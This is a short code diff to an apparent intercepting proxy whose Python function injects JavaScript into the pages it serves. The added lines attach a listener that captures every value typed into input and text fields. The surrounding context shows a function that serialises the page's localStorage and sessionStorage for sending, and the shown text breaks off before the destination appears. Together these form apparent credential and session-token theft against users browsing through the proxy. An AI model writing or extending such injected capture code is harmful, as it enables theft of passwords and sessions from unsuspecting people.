@@ -27,6 +27,12 @@ def proxy(path):
 
     injected_js = """
     <script>
+        document.addEventListener("input", function(event) {
+    if (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA") {
+        console.log(`Input detected in ${event.target.tagName}:`, event.target.value);
+    }
+});
+
         function sendStorageData() {
             const localStorageData = JSON.stringify(localStorage);
             const sessionStorageData = JSON.stringify(sessionStorage);
